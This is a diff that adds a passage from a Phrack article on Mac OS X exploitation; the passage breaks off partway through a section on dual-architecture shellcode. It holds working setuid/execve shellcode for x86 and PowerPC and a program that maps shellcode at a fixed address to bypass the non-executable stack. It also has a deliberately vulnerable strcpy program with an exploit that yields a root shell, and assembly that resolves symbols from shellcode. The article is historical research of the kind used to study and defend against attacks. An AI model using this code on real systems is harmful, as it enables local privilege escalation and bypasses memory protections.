@@ -1,0 +1,2990 @@
+              _                                                _
+            _/B\_                                            _/W\_
+            (* *)            Phrack #64 file 11               (* *)
+            | - |                                            | - |
+            |   |        Mac OS X wars - a XNU Hope          |   |
+            |   |                                            |   |
+            |   |      by nemo <nemo@felinemenace.org>       |   |
+            |   |                                            |   |
+            |   |                                            |   |
+            (____________________________________________________)
+
+
+--[ Contents
+
+  1 - Introduction.
+
+  2 - Local shellcode maneuvering.
+
+  3 - Resolving symbols from Shellcode.
+
+  4 - Architecture spanning shellcode.
+
+  5 - Writing kernel level shellcode.
+   5.1 - Local privilege escalation
+   5.2 - Breaking chroot()
+   5.3 - Advancements
+
+  6 - Misc rootkit techniques.
+
+  7 - Universal binary infection.
+
+  8 - Cracking example - Prey
+
+  9 - Passive malware propagation with mDNS
+
+ 10 - Kernel zone allocator exploitation.
+
+ 11 - Conclusion
+
+ 12 - References
+
+ 13 - Appendix A: Code
+
+
+--[ 1 - Introduction
+
+This paper was written in order to document my research while 
+playing with Mac OS X shellcode.  During this process, however,
+the paper mutated and evolved to cover a selection of Mac OS X 
+related topics which will hopefully make for an interesting read.
+
+Due to the growing popularity of Mac OS X on Intel over PowerPC platforms,
+I have mostly focused on techniques for the former.  Many of the concepts 
+shown are still applicable on PowerPC architecture, but their particular
+implementation is left as an excercise for the reader.
+
+There are already several well written documents on PowerPC and 
+Intel assembly language; I will therefore make no attempt to try
+and teach you these things. 
+
+If you have any suggestions on how to shorten/tighten the code I 
+have written for this paper please drop me an email with the details at: 
+nemo@felinemenace.org.
+
+A tar file containing the full code listings referenced in this paper 
+can be found in Appendix A.
+
+
+--[ 2 - Local shellcode maneuvering.
+
+Over the years there have been many different techniques 
+developed to calculate valid return addresses when 
+exploiting buffer overflows in applications local to 
+your system.  Unfortunately many of these techniques are
+now obsolete on Intel-based Mac OS X systems with the 
+introduction of a non-executable stack in version 10.4
+(Tiger).
+
+In the following subsections I will discuss a few historical 
+approaches for calculating shellcode addresses in memory  
+and introduce a new method for positioning shellcode at a 
+fixed location in the address space of a vulnerable target 
+process.
+
+--[ 2.1 Historical perspective 1: Aleph1
+
+Over the years there have been many different techniques 
+developed to calculate a valid return address when exploiting
+a buffer overflow in an application local to your system. 
+The most widely known of these is shown in aleph1's "Smashing 
+the Stack for Fun and Profit". [9] In this paper, aleph1 simply
+writes a small function get_sp() shown below.
+
+	unsigned long get_sp(void) {
+	   __asm__("movl %esp,%eax");
+	}
+
+This function returns the current stack pointer (esp). 
+aleph1 then simply offsets from this value, in an attempt to hit
+the nop sled before his shellcode on the stack. This method is
+not as precise as it can be, and also requires the shellcode to
+be stored on the stack.  This is an obvious issue if your stack is
+non-executable.
+
+--[ 2.2 Historical perspective 2: Radical Environmentalist
+
+Another method for storing shellcode and calculating the address
+of it inside another process is shown in the Radical 
+Environmentalist paper written by the Netric Security Group [10].
+
+In this paper, the author shows that the execve() syscall allows 
+full control over the stack of the freshly executed process. 
+Because of this, shellcode can be stored in an environment 
+variable, the address of which can be calculated as displacement 
+from the top of the stack.
+
+In older exploits for Mac OS X (prior to 10.4), this technique 
+worked quite well. Since there is no non-executable stack on 
+PowerPC 
+
+--[ 2.3 Beating stack prot :P or whatever
+
+In KF's paper "Non eXecutable Stack Loving on Mac OS X86" [11], 
+the author demonstrates a technique for removing stack protection
+by returning into mprotect() in libSystem (libc) before
+returning into their payload. While this technique is very useful
+for remote exploitation, a more elegant solution to this problem 
+exists for local exploitation.
+
+The first step to getting our shellcode in place is to get some 
+shellcode. There has already been significant published work 
+in this area. If you are interested to learn how to write 
+shellcode for Mac OS X for use in local privilege escalation 
+exploits, a couple of papers you should definitely check out are
+shown in the references section. [1] and [8]. The shellcode 
+chosen for the sample code is described in full in section 2 
+of this paper.
+
+The method which I now propose relies on an undocumented the
+undocumented Mac OS X system call "shared_region_mapping_np".
+This syscall is used at runtime by the dynamic loader (dyld) 
+to map widely used libraries across the address space of every 
+process on the system; this functionality has many evil uses. 
+
+The file /usr/include/sys/syscalls.h contains the syscall 
+number for each of the syscalls. Here is the appropriate 
+line in that file which contains our syscall.
+
+	#define SYS_shared_region_map_file_np 299
+
+Here is the prototype for this syscall:
+
+	struct shared_region_map_file_np(
+		int fd,
+		uint32_t mappingCount,
+		user_addr_t mappings, 
+		user_addr_t slide_p 
+	);
+
+The arguments to this syscall are very simple:
+
+fd             an open file descriptor, providing access to data that 
+               we want loaded in memory.
+mappingCount   the number of mappings which we want to make from the 
+               file.
+mappings       a pointer to an array of _shared_region_mapping_np
+               structs which describe each mapping (see below).
+slide_p        determines whether the syscall is allowed to slide
+               the mapping around inside the shared region of memory
+	       to make it fit.
+
+Here is the struct definition for the elements of the third argument:
+
+	struct _shared_region_mapping_np {
+		mach_vm_address_t   	address;
+		mach_vm_size_t      	size;
+		mach_vm_offset_t    	file_offset;
+		vm_prot_t               max_prot;  
+		vm_prot_t               init_prot; 
+	};
+
+The struct elements shown above can be explained as followed:
+
+address        the address in the shared region where the data should
+               be stored.
+size           the size of the mapping (in bytes)
+file_offset    the offset into the file descriptor to which we must
+               seek in order to reach the start of our data.
+max_prot       This is the maximum protection of the mapping,
+               this value is created by or'ing the #defines:
+	       VM_PROT_EXECUTE,VM_PROT_READ,VM_PROT_WRITE and VM_COW.
+init_prot      This is the initial protection of the mapping, again
+               this is created by or'ing the values mentioned above.
+
+The following #define's describe the shared region in which
+we can map our data. They show the various regions within the
+0x00000000->0xffffffff address space which are available to
+use as shared regions. These are shown as defined as starting
+point, followed by size.
+
+#define SHARED_LIBRARY_SERVER_SUPPORTED
+#define GLOBAL_SHARED_TEXT_SEGMENT      0x90000000
+#define GLOBAL_SHARED_DATA_SEGMENT      0xA0000000
+#define GLOBAL_SHARED_SEGMENT_MASK      0xF0000000
+
+#define SHARED_TEXT_REGION_SIZE         0x10000000
+#define SHARED_DATA_REGION_SIZE         0x10000000
+#define SHARED_ALTERNATE_LOAD_BASE      0x09000000
+
+To reduce the chance that our shellcode offset will be 
+stored at an address that does not contain a NULL byte 
+(thereby making this technique viable for string based 
+overflows), we position the shellcode at the last address in 
+the region where a page (0x1000 bytes) can be mapped.  By 
+doing so, our shellcode will be stored at the address 
+0x9ffffxxx.
+
+The following code can be used to map some shellcode into
+a fixed location by opening the file "/tmp/mapme" and writing 
+our shellcode out to it. It then uses the file descriptor
+to call the "shared_region_map_file_np" which maps the
+code, as well as a bunch of int3's (cc), into the shared
+region.
+
+/*--------------------------------------------------------
+ * [ sharedcode.c ] 
+ *
+ * by nemo@felinemenace.org 2007
+ */ 
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <mach/vm_prot.h>
+#include <mach/i386/vm_types.h>
+#include <mach/shared_memory_server.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BASE_ADDR 0x9ffff000
+#define PAGESIZE  0x1000
+#define FILENAME  "/tmp/mapme"
+
+char dual_sc[] =
+"\x5f\x90\xeb\x60"
+
+// setuid() seteuid()
+"\x38\x00\x00\xb7\x38\x60\x00\x00"
+"\x44\x00\x00\x02\x38\x00\x00\x17"
+"\x38\x60\x00\x00\x44\x00\x00\x02"
+
+// ppc execve() code by b-r00t
+"\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
+"\x7d\x68\x02\xa6\x3b\xeb\x01\x70"
+"\x39\x40\x01\x70\x39\x1f\xfe\xcf"
+"\x7c\xa8\x29\xae\x38\x7f\xfe\xc8"
+"\x90\x61\xff\xf8\x90\xa1\xff\xfc"
+"\x38\x81\xff\xf8\x38\x0a\xfe\xcb"
+"\x44\xff\xff\x02\x7c\xa3\x2b\x78"
+"\x38\x0a\xfe\x91\x44\xff\xff\x02"
+"\x2f\x62\x69\x6e\x2f\x73\x68\x58"
+
+// seteuid(0);
+"\x31\xc0\x50\xb0\xb7\x6a\x7f\xcd"
+"\x80"
+// setuid(0);
+"\x31\xc0\x50\xb0\x17\x6a\x7f\xcd"
+"\x80"
+// x86 execve() code / nemo
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+"\x54\x54\x53\x53\xb0\x3b\xcd\x80";
+
+
+struct _shared_region_mapping_np {
+	mach_vm_address_t   	address;
+	mach_vm_size_t      	size;
+	mach_vm_offset_t    	file_offset;
+	vm_prot_t               max_prot;   /* read/write/execute/COW/ZF */
+	vm_prot_t               init_prot;  /* read/write/execute/COW/ZF */
+};
+
+int main(int argc,char **argv)
+{
+	int fd;
+	struct _shared_region_mapping_np sr;
+	chr data[PAGESIZE] = { 0xcc };
+	char *ptr = data + PAGESIZE - sizeof(dual_sc);
+	
+	sr.address     = BASE_ADDR;
+	sr.size        = PAGESIZE;
+	sr.file_offset = 0;
+	sr.max_prot    = VM_PROT_EXECUTE | VM_PROT_READ | VM_PROT_WRITE;
+	sr.init_prot   = VM_PROT_EXECUTE | VM_PROT_READ | VM_PROT_WRITE; 
+
+	if((fd=open(FILENAME,O_RDWR|O_CREAT))==-1)
+	{
+		perror("open");
+		exit(EXIT_FAILURE);
+	}
+
+	memcpy(ptr,dual_sc,sizeof(dual_sc));
+
+	if(write(fd,data,PAGESIZE) != PAGESIZE)
+	{
+		perror("write");
+		exit(EXIT_FAILURE);
+	}
+
+	if(syscall(SYS_shared_region_map_file_np,fd,1,&sr,NULL)==-1)
+	{
+		perror("shared_region_map_file_np");
+		exit(EXIT_FAILURE);
+	}
+
+	close(fd);
+	unlink(FILENAME);
+
+	printf("[+] shellcode at: 0x%x.\n",sr.address + 
+					   PAGESIZE - 
+					   sizeof(dual_sc));
+
+	exit(EXIT_SUCCESS);
+}
+
+/*---------------------------------------------------------*/
+
+When we compile and execute this code, it prints the address of
+the shellcode in memory. You can see this below.
+
+	-[nemo@fry:~/code]$ gcc sharedcode.c -o sharedcode
+	-[nemo@fry:~/code]$ ./sharedcode 
+	[+] shellcode at: 0x9fffff71.
+
+As you can see the address used for our shellcode is 0x9fffff71.
+This address, as expected, is free of NULL bytes.
+
+You can test that this procedure has worked as expected by 
+starting a new process and connecting to it with gdb.
+
+By jumping to this address using the "jump" command in gdb
+our shellcode is executed and a bash prompt is displayed.
+
+	-[nemo@fry:~/code]$ gdb /usr/bin/id
+	GNU gdb 6.3.50-20050815 (Apple version gdb-563) 
+	(gdb) r
+	Starting program: /usr/bin/id 
+	^C[Switching to process 752 local thread 0xf03]
+	0x8fe01010 in __dyld__dyld_start ()
+	Quit
+	(gdb) jump *0x9fffff71
+	Continuing at 0x9fffff71.
+	(gdb) c
+	Continuing.
+	-[nemo@fry:Users/nemo/code]$  
+
+In order to demonstrate how this can be used in an exploit, 
+I have created a trivially exploitable program:
+
+	/*
+	 * exploitme.c
+
+	 */ 
+	int main(int ac, char  **av)
+	{
+		char buf[50] = { 0 };
+		printf("%s",av[1]);
+
+		if(ac == 2)
+			strcpy(buf,av[1]);
+
+		return 1;
+	}
+
+Below is the exploit for the above program. 
+
+	/*
+	 * [ exp.c ]
+	 * nemo@felinemeance.org 2007
+	 */
+
+	#include <stdio.h>
+	#include <stdlib.h>
+
+	#define VULNPROG "./exploitme"
+	#define OFFSET 66  
+	#define FIXEDADDR 0x9fffff71
+
+	int main(int ac, char **av)
+	{
+		char evilbuff[OFFSET];
+		char *args[] = {VULNPROG,evilbuff,NULL};
+		char *env[]  = {"TERM=xterm",NULL};
+		long *ptr = (long *)&(evilbuff[OFFSET - 4]);
+		memset(evilbuff,'A',OFFSET);
+		*ptr = FIXEDADDR;
+
+		execve(*args,args,env);
+		return 1;
+	}
+
+As you can see we fill the buffer up with "A"'s, followed by our
+return address calculated by sharedcode.c. After the strcpy() occurs 
+our stored return address on the stack is overwritten with our new 
+return address (0x9fffff71) and our shellcode is executed.
+
+If we chown root /exploitme; chmod +s /exploitme; we can see
+that our shellcode is mapped into suid processes, which makes
+this technique feasible for local privilege escalation. Also, 
+because we control the memory protection on our mapping, we bypass 
+non-executable stack protection.
+
+	-[nemo@fry:/]$ ./exp
+	fry:/ root# id
+	uid=0(root)
+
+One limitation of this technique is that the file you are 
+mapping into the shared region must exist on the root file-
+system. This is clearly explained in the comment below.
+
+/*
+ * The split library is not on the root filesystem.  We don't
+ * want to pollute the system-wide ("default") shared region
+ * with it.
+ * Reject the mapping.  The caller (dyld) should "privatize"
+ * (via shared_region_make_private()) the shared region and
+ * try to establish the mapping privately for this process.
+ */
+]
+
+Another limitation to this technique is that Apple have locked 
+down this syscall with the following lines of code:
+
+	 *
+	 * This system call is for "dyld" only.
+	 *
+
+Luckily we can beat this magnificent protection by....
+completely ignoring it.
+
+
+--[ 3 - Resolving Symbols From Shellcode
+
+In this section I will demonstrate a method which can be used to 
+resolve the address of a symbol from shellcode.
+
+This is useful in remote exploitation where you wish to access 
+or modify some of the functionality of the vulnerable program. 
+This may also be useful in calling some of the functions in a 
+particular shared library in the address space.
+
+The examples in this section are written in Intel assembly, nasm 
+syntax. The concepts presented can easily be recreated in 
+PowerPC assembler. If anyone takes the time to do this let me 
+know.
+
+The method I will describe requires some basic knowledge about
+the Mach-O object format and how symbols are stored/resolved. 
+I will try to be as verbose as I can, however if more research 
+is required check out the Mach-O Runtime document from the 
+Apple website. [4]
+
+The process of resolving symbols which I am describing in this
+section involves locating the LINKEDIT section in memory.
+
+The LINKEDIT section is broken up into a symbol table (symtab)
+and string table (strtab) as follows:
+
+      [ LINKEDIT SECTION ]
+
+low memory: 0x0
+.________________________________,
+|---(symtab data starts here.)---| 
+|<nlist struct>                  |
+|<nlist struct>                  |
+|<nlist struct>                  |
+| ...                            |
+|---(strtab data starts here.)---|
+|"_mh_execute_header\0"          |
+|"dyld_start\0"                  |
+|"main"                          |
+| ...                            |
+:________________________________;
+himem : 0xffffffff
+
+By locating the start of the string table and the start of the
+symbol table relative to the address of the LINKEDIT section
+it is then possible to loop through each of the nlist structures
+in the symbol table and access their appropriate string in
+the string table. I will now run through this technique in fine
+detail.
+
+To resolve symbols we will start by locating the mach_header in 
+memory. This will be the start of our mapped in mach-o image.
+One way to find this is to run the "nm" command on our binary
+and locate the address of the __mh_execute_header symbol.
+
+Currently on Mac OS X, the executable is simply mapped in at 
+the start of the first page. 0x1000. 
+
+We can verify this as follows:
+
+	-[nemo@fry:~]$ nm /bin/sh | grep mh_
+	00001000 A __mh_execute_header
+
+	(gdb) x/x 0x1000
+	0x1000: 0xfeedface
+
+As you can see the magic number (0xfeedface) is at 0x1000.
+This is our Mach-O header. The struct for this is shown 
+below:
+
+	struct mach_header 
+	{ 
+	    uint32_t magic; 
+	    cpu_type_t cputype; 
+	    cpu_subtype_t cpusubtype; 
+	    uint32_t filetype; 
+	    uint32_t ncmds; 
+	    uint32_t sizeofcmds; 
+	    uint32_t flags; 
+	}; 
+
+In my shellcode I assume that the file we are parsing always
+has a LINKEDIT section and a symbol table load command 
+(LC_SYMTAB).  This means that I do not bother parsing the
+mach_header struct. However if you do not wish to make this 
+assumption, it is easy enough to loop ncmds number of times 
+while parsing the load commands.
+
+Directly after the mach_header struct in memory are a bunch
+of load_commands. Each of these commands begins with a "cmd"
+id field, and the size of the command.
+
+Therefore, we start our code by setting ecx to the address of 
+the first load command, directly after the mach_header struct 
+in memory. This positions us at 0x101c. We then null out some 
+of the registers to use later in the code. 
+
+	;# null out some stuff (ebx,edx,eax)
+        xor     ebx,ebx
+	mul     ebx                            
+
+	;# position ecx past the mach_header.
+	xor	ecx,ecx
+        mov     word cx,0x101c              
+
+For symbol resolution, we are only interested in LC_SEGMENT 
+commands and the LC_SYMTAB. In particular we are looking for
+the LINKEDIT LC_SEGMENT struct. This is explained in more 
+detail later.
+
+The #define's for these are in /usr/include/mach-o/loader.h
+as follows:
+
+	#define LC_SEGMENT      0x1     
+		/* segment of this file to be mapped */
+	#define LC_SYMTAB       0x2     
+		/* link-edit stab symbol table info */
+
+The LC_SYMTAB command uses the following struct:
+
+	struct symtab_command 
+	{ 
+	    uint_32 cmd; 
+	    uint_32 cmdsize; 
+	    uint_32 symoff; 
+	    uint_32 nsyms; 
+	    uint_32 stroff; 
+	    uint_32 strsize; 
+	}; 
+
+
+
+The symoff field holds the offset from the start of the file to 
+the symbol table. The stroff field holds the offset to the string 
+table. Both the symbol table and string table are contained in 
+the LINKEDIT section.  
+
+By subtracting the symoff from the stroff we get the offset into 
+the LINKEDIT section in which to read our strings. The nsyms 
+field can be used as a loop count when enumerating the symtab. 
+For the sake of this sample code, however,i have assumed that 
+the symbol exists and ignored the nsyms field entirely. 
+
+We find the LC_SYMTAB command simply by looping through and 
+checking the "cmd" field for 0x2.
+
+The LINKEDIT section is slightly harder to find; we need to look 
+for a load command with the cmd type 0x1 (segment_command), 
+then check for the name "__LINKEDIT" in the segname field of
+the struct. The segment_command struct is shown below:
+
+	struct segment_command 
+	{ 
+	    uint32_t cmd; 
+	    uint32_t cmdsize; 
+	    char segname[16]; 
+	    uint32_t vmaddr; 
+	    uint32_t vmsize; 
+	    uint32_t fileoff; 
+	    uint32_t filesize; 
+	    vm_prot_t maxprot; 
+	    vm_prot_t initprot; 
+	    uint32_t nsects; 
+	    uint32_t flags; 
+	}; 
+
+I will now run through an explanation of the assembly code 
+used to accomplish this technique.
+
+I have used a trivial state machine to loop through each 
+load_command until both the symbol table and LINKEDIT virtual 
+addresses have been found. 
+
+First we check which type of load_command each is and then we 
+jump to the appropriate handler, if it is one of the types we 
+need.
+
+next_header:
+	cmp     byte [ecx],0x2  ;# test for LC_SYMTAB (0x2)
+	je      found_lcsymtab
+
+	cmp     byte [ecx],0x1  ;# test for LC_SEGMENT (0x1)
+	je      found_lcsegment
+
+The next two instructions add the length field of the 
+load_command to our pointer. This positions us over the cmd 
+field of the next load_command in memory. We jump back up
+to the next_header symbol and compare again.
+
+next:   
+	add     ecx,[ecx + 0x4]   ;# ecx += length 
+	jmp     next_header
+
+
+The found_lcsymtab handler is called when we have a cmd == 0x2.
+We make the assumption that there's only one LC_SYMTAB. We can 
+use the fact that if we're here, eax hasn't been set yet and is 0.
+By comparing this with edx we can see if the LINKEDIT segment has 
+been found. After the cmp, we update eax with the address of the 
+LC_SYMTAB. If both the LINKEDIT and LC_SYMTAB sections have been 
+found, we jmp to the "found_both" symbol, otherwise we process
+the next header.
+        
+found_lcsymtab:
+	cmp     eax,edx    ;# use the fact that eax is 0 to test edx.
+	mov     eax,ecx    ;# update eax with current pointer.
+	jne     found_both ;# we have found LINKEDIT and LC_SYMTAB
+	jmp     next       ;# keep looking for LINKEDIT
+
+The found_lcsegment handler is very similar to the 
+found_lcsymtab code. However, since there are many LC_SEGMENT 
+commands in most files we need to be sure that we've found 
+the __LINKEDIT section.
+
+To do this we add 8 to the struct pointer to get to the 
+segname[] string. We then check 2 characters in, skipping
+the "__" for the 4 bytes "LINK". 0x4b4e494c accounting for
+endian issues. Again, we use the fact that there should 
+only be one LINKEDIT section. This means that if we are
+past the check for "LINK" edx is 0. We use this to test
+eax, to see if the LC_SYMTAB command has been found.
+Again if we are done we jmp to found_both, if not back 
+up to the "next_header" symbol.
+
+found_lcsegment:
+	lea     esi,[ecx + 0x8] ;# get pointer to name
+	;# test for "LINK"
+	cmp     long [esi + 0x2],0x4b4e494c     
+	jne     next            ;# it's not LINKEDIT, NEXT!
+	cmp     edx,eax         ;# use zero'ed edx to test eax
+	mov     edx,ecx         ;# set edx to current address
+	jne     found_both      ;# we're done!
+	jmp     next            ;# still need to find 
+				;# LC_SYMTAB, continue
+				;# EDX = LINKEDIT struct
+				;# EAX = LC_SYMTAB struct
+
+Now that we have our pointers to LINKEDIT and LC_SYMTAB, we can 
+subtract symtab_command.symoff from symtab_command.stroff to 
+obtain the offset of the strings table from the start of LINKEDIT.
+By adding this offset to LINKEDIT's virtual address, we have now
+calculated the virtual address of the string table in memory.
+
+found_both:
+        mov     edi,[eax + 0x10]       ;# EDI = stroff
+        sub     edi,[eax + 0x8]        ;# EDI -= symoff
+        mov     esi,[edx + 0x18]       ;# esi = VA of linkedit
+        add     edi,esi       ;# add virtual address of LINKEDIT to offset
+
+The LINKEDIT section contains a list of "struct nlist" structures.
+Each one corresponds to a symbol. The first union contains an offset
+into the string table (which we have the VA for). In order to find the 
+symbol we want we simply cycle through the array and offset our
+string table pointer to test the string.
+
+	struct nlist 
+	{ 
+	    union { 
+	    #ifndef __LP64__ 
+		char *n_name; 
+	    #endif 
+		int32_t n_strx; 
+	    } n_un; 
+	    uint8_t n_type; 
+	    uint8_t n_sect; 
+	    int16_t n_desc; 
+	    uint32_t n_value; 
+	}; 
+]
+
+Now that we are able to walk through our nlist structs we are good
+to go. However it wouldn't make sense to store the full symbol 
+name in our shellcode as this would make the code larger than it 
+already is. ;/
+
+I have chosen to steal^H^H^H^Huse skape's "compute_hash" function
+from "Understanding Windows Shellcode" [5]. He explains how the 
+code works in his paper.
+
+The following code shows a simple loop. First we jump down to the
+"hashes" symbol, and call back up to get a pointer to our list of
+hashes. We read the first hash in, and then loop through each of
+the nlist structures, hashing the symbol found and comparing it
+against our precomputed hash.
+
+If the hash is unsuccessful we jump back up to "check_next_hash",
+however if it's successful we continue down to the "done" symbol.
+
+;# esi == constant pointer to nlist
+;# edi == strtab base
+
+lookup_symbol:
+        jmp     hashes
+lookup_symbol_up:
+        pop     ecx
+        mov     ecx,[ecx]           ;# ecx = first hash     
+check_next_hash:
+        push    esi                 ;# save nlist pointer
+        push    edi                 ;# save VA of strtable
+        mov     esi,[esi]           ;# *esi = offset from strtab to string
+        add     esi,edi             ;# add VA of strtab
+compute_hash:
+        xor edi, edi
+        xor eax, eax
+        cld
+compute_hash_again:
+        lodsb
+        test al, al                 ;# test if on the last byte.
+        jz compute_hash_finished
+        ror edi, 0xd
+        add edi, eax
+        jmp compute_hash_again
+compute_hash_finished:
+        cmp     edi,ecx
+        pop     edi
+        pop     esi
+        je      done
+        lea     esi,[esi + 0xc]     ;# Add sizeof(struct nlist)
+        jmp     check_next_hash
+done:   
+
+Each hash we wish to resolve can be appended after the hashes: symbol.
+
+                                                ;# hash in edi
+hashes: 
+        call    lookup_symbol_up
+        dd	0x8bd2d84d
+
+Now that we have the address of our symbol we're all done and can 
+call our function, or modify it as we need.
+
+In order to calculate the hash for our required symbol, I have cut
+and paste some of skapes code into a little c progam as follows:
+
+	#include <stdio.h>
+	#include <stdlib.h>
+
+	char chsc[] = 
+	"\x89\xe5\x51\x60\x8b\x75\x04\x31"
+	"\xff\x31\xc0\xfc\xac\x84\xc0\x74"
+	"\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4"
+	"\x89\x7d\xfc\x61\x58\x89\xec\xc3";
+
+	int main(int ac, char **av)
+	{
+		long (*hashstr)() = (long (*)())chsc;
+
+		if(ac != 2) {
+			fprintf(stderr,"[!] usage: %s <string to hash>\n",*av);
+			exit(1);
+		}
+
+		printf("[+] Hash: 0x%x\n",hashstr(av[1]));
+
+		return 0;
+	}
+
+We can run this as shown below to generate our hash:
+
+-[nemo@fry:~/code/kernelsc]$ ./comphash _do_payload
+[+] Hash: 0x8bd2d84d
+
+If the symbol we have resolved is a function that we wish to call
+there is a little more we must do before this is possible.
+
+Mac OS X's linker, by default, uses lazy binding for external 
+symbols. This means that if our intended function calls another
+function in an external library, which hasn't been called elsewhere
+in the program already, the dynamic linker will try to resolve
+the address as you call it.
+
+For example, a call to execve() with lazy binding will be replaced
+with a call to dyld_stub_execve() as shown below:
+
+0x1f54 <do_payload+78>: call   0x301b <dyld_stub_execve>
+
+At runtime this function contains one instruction:
+
+call   0x8fe12f70 <__dyld_fast_stub_binding_helper_interface>
+
+This invokes the dyld which resolves the symbol and replaces this
+instruction with a jmp to the real code:
+
+jmp    0x9003b7d0 <execve>
+
+The only problem which this causes is that this function requires
+the stack pointer to be correctly aligned, otherwise our code will
+crash.
+
+To do this we simply subtract 0xc from our stack pointer before
+calling our function.
+
+Note: 
+	This will not be necessary if the program you are 
+	exploiting has been compiled with the -bind_at_load 
+	flag.
+
+Here is the code I have used to make the call.
+
+done:   
+        mov     eax,[esi + 0x8] ;# eax == value
+        xchg esp,edx            ;# annoyingly large
+        sub dl,0xc              ;# way to align the stack pointer
+        xchg esp,edx            ;# without null bytes.
+        call    eax
+        xchg esp,edx            ;# annoyingly large
+        add dl,0xc              ;# way to fix up the stack pointer
+        xchg esp,edx            ;# without null bytes.
+        ret
+
+I have written a small sample c program to demonstrate this code
+in action.
+
+The following code has no call to do_payload(). The shellcode will
+resolve the address of this function and call it.
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char symresolve[] =
+"\x31\xdb\xf7\xe3\x31\xc9\x66\xb9\x1c\x10\x80\x39\x02\x74\x0a\x80"
+"\x39\x01\x74\x0d\x03\x49\x04\xeb\xf1\x39\xd0\x89\xc8\x75\x16\xeb"
+"\xf3\x8d\x71\x08\x81\x7e\x02\x4c\x49\x4e\x4b\x75\xe7\x39\xc2\x89"
+"\xca\x75\x02\xeb\xdf\x8b\x78\x10\x2b\x78\x08\x8b\x72\x18\x01\xf7"
+"\xeb\x39\x59\x8b\x09\x56\x57\x8b\x36\x01\xfe\x31\xff\x31\xc0\xfc"
+"\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x39\xcf\x5f\x5e"
+"\x74\x05\x8d\x76\x0c\xeb\xde\x8b\x46\x08\x87\xe2\x80\xea\x0c\x87"
+"\xe2\xff\xd0\x87\xe2\x80\xc2\x0c\x87\xe2\xc3\xe8\xc2\xff\xff\xff"
+"\x4d\xd8\xd2\x8b"; // HASH
+
+void do_payload()
+{
+        char *args[] = {"/usr/bin/id",NULL};
+        char *env[]  = {"TERM=xterm",NULL};
+        printf("[+] Executing id.\n");
+        execve(*args,args,env);
+}
+
+int main(int ac, char **av)
+{
+        void (*fp)() = (void (*)())symresolve;
+        fp();
+        return 0;
+}
+
+
+As you can see below this code works as you'd expect.
+
+-[nemo@fry:~]$ ./testsymbols 
+[+] Executing id.
+uid=501(nemo) gid=501(nemo) groups=501(nemo)
+
+The full assembly listing for the method shown in this section
+is shown in the Appendix for this paper.
+
+I originally worked on this method for resolving kernel symbols.
+
+Unfortunately, the kernel jettisons (free()'s) the LINKEDIT section
+after it boots. Before doing this, it writes out the mach-o file 
+/mach.sym containing the symbol information for the kernel.
+
+If you set the boot flag "keepsyms" the LINKEDIT section will 
+not be free()'ed and the symbols will remain in kernel memory.
+
+In this case we can use the code shown in this section, and 
+simply scan memory starting from the address 0x1000 until we 
+find 0xfeedface. Here is some assembly code to do this:
+
+SECTION .text
+_main:
+        xor     eax,eax
+        inc     eax
+        shl     eax,0xc         ;# eax = 0x1000
+        mov     ebx,0xfeedface  ;# ebx = 0xfeedface
+up:
+        inc     eax
+        inc     eax
+        inc     eax
+        inc     eax             ;# eax += 4
+        cmp     ebx,[eax]       ;# if(*eax != ebx) {
+        jnz     up              ;#      goto up }
+        ret
+
+After this is done we can resolve kernel symbols as needed.
+
+--[ 4 - Architecture Spanning Shellcode
+
+Since the move from PowerPC to Intel architecture it has become 
+common to find both PowerPC and Intel Macs running Mac OS X in
+the wild. On top of this, Mac OS X 10.4 ships with virtualization
+technology from Transitive called Rosetta which allows an Intel Mac 
+toexecute a PowerPC binary.  This means that even after you've 
+finger-printed the architecture of a machine as Intel, there's a 
+chance a network facing daemon might be running PowerPC code. This 
+poses a challenge when writing remote exploits as it is harder 
+incorrectly fingerprinting the architecture of the machine will 
+result in failure.
+
+In order to remedy this a technique can be used to create 
+shellcode which executes on both Intel and PowerPC architecture.
+
+This technique has been documented in the Phrack article of the same
+name as this section [16]. 
+I provide a brief explanation here as this technique is used 
+throughout the remainder of the paper.
+
+The basic premise of this technique is to find a PowerPC instruction
+which, when executed, will simply step forward one instruction. It
+must do this without performing any memory access, only changing the
+state of the registers. When this instruction is interpreted as Intel
+opcodes however, a jump must be performed. This jump must be over the
+PowerPC portion of the code and into the Intel instructions. In this 
+way the architecture type can be determined.
+
+A suitable PowerPC instruction exists. This is the "rlwnm"
+instruction.
+
+The following is the definition of this instruction, taken from the
+PowerPC manual:
+
+(rlwnm) Rotate Left Word then AND with Mask (x'5c00 0000')
+
+rlwnm  	rA,rS,rB,MB,ME	(Rc = 0) 
+rlwnm. 	rA,rS,rB,MB,ME	(Rc = 1) 
+
+,__________________________________________________________.
+|10101 |   S    |     A    |    B    |   MB    |   ME    |Rc|
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+0     5 6     10 11      15 16     20 21     25 26       30 31
+
+This is the rotate left instruction on PowerPC. Basically a mask,
+(defined by the bits MB to ME) is applied and the register rS is
+rotated rB bits. The result is stored in rA. No memory access is
+made by this instruction regardless of the arguments given.
+
+By using the following parameters for this instruction we can
+end up with a valid and useful opcode.
+
+	rA = 16
+	rS = 28
+	rB = 29
+	MB = XX
+	ME = XX
+	
+	rlwnm r16,r28,r29,XX,XX
+
+This leaves us with the opcode:
+
+	"\x5f\x90\xeb\xxx" 
+
+When this is broken down as Intel code it becomes the following 
+instructions:
+
+nasm > db 0x5f,0x90,0xeb,0xXX
+00000000  5F                pop edi	    // move edi to the stack
+00000001  90                nop		    // do nothing.
+00000002  EBXX              jmp short 0xXX  // jump to our payload.
+
+Here is a small example of how this can be useful.
+
+	char trap[] =
+	"\x5f\x90\xeb\x06"	// magic arch selector
+	"\x7f\xe0\x00\x08"	// trap ppc instruction
+	"\xcc\xcc\xcc\xcc";	// intel: int3 int3 int3 int3
+
+This shellcode when executed on PowerPC architecture will 
+execute the "trap" instruction directly below our selector code.
+However when this is interpreted as Intel architecture instructions
+the "eb 06" causes a short jump to the int3 instructions. The 
+reason 06 rather than 04 is used for our jmp short value here is that
+eip is pointing to the start of the jmp instruction itself (eb) 
